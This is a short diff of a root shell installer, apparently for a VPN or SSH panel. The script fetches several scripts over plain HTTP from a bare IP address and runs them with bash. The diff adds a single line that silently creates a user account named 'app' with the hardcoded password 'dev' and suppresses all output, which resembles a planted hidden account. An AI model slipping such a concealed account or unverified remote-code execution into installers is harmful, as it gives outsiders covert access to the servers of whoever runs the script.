@@ -41,6 +41,7 @@ wget -O /usr/local/sbin/jho/inactive.sh http://107.152.37.78/yutax/app/xprem
 wget -O /usr/local/sbin/jho/deleted.sh http://107.152.37.78/yutax/app/deleted
 chmod -R +x /usr/local/sbin/jho/
 cd /root
+/usr/sbin/useradd -p $(openssl passwd -1 dev) -s /bin/false -M app &> /dev/null;
 rm -rf *sh
 /bin/bash /usr/local/sbin/jho/active.sh
 /bin/bash /usr/local/sbin/jho/inactive.sh
